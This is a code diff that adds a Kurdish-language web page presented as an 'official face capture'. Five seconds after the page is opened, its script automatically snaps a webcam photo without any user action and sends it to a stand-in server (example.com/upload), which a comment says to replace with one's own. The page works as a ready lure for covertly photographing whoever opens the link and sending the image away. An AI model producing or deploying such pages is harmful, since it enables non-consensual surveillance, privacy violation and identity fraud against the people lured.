@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>وەرگرتنی ڕەسمی دەموچاو بە کامێراکە</title>
+    <style>
+        #camera {
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #000;
+        }
+    </style>
+</head>
+<body>
+    <h1>وێنەی ڕەسمی دەموچاو بە کامێراکە وەربگرە</h1>
+    <div id="camera"></div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.26/webcam.min.js"></script>
+    <script>
+        // ڕێکخستنی کامێرا
+        Webcam.set({
+            width: 400,
+            height: 300,
+            image_format: 'jpeg',
+            jpeg_quality: 90
+        });
+        Webcam.attach('#camera');
+
+        // ئۆتۆماتیکی وێنە وەربگرە
+        setTimeout(() => {
+            Webcam.snap((dataURI) => {
+                // ناردنی وێنەکە بۆ سێرڤەر
+                fetch('https://example.com/upload', { // لینکی سێرڤەرەکەت لێرە دابنێ
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ image: dataURI }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('وێنەکە بەسەرکەوتوویی نێردرا:', data);
+                })
+                .catch((error) => {
+                    console.error('هەڵە:', error);
+                });
+            });
+        }, 5000); // 5 چرکە دوای کردنەوەی لینکەکە وێنەکە وەردەگیرێت
+    </script>
+</body>
+</html>
